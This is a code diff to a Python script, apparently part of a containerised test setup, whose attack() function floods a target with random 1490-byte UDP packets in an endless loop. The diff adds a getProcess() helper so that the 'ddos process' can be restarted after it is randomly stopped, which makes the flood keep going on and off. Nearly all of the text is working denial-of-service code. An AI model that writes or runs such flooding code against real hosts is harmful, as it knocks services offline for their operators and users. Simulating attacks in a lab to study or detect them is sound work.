@@ -15,12 +15,15 @@ def attack():
     while True:
         sock.sendto(os.urandom(1490), TARGET)
 
+def getProcess():
+    return multiprocessing.Process(target=attack)
+
 if __name__ == '__main__':
     # Wait a few seconds for target container to spin up
     time.sleep(3)
 
     # Declare the ddos process
-    p = multiprocessing.Process(target=attack)
+    p = getProcess()
 
     while True:
         # Sleep for 5 seconds
@@ -30,4 +33,6 @@ if __name__ == '__main__':
         if random.randint(1, 5) == 5:
             if p.is_alive():
                 p.terminate()
-            else: p.start()
+            else:
+                p = getProcess()
+                p.start()
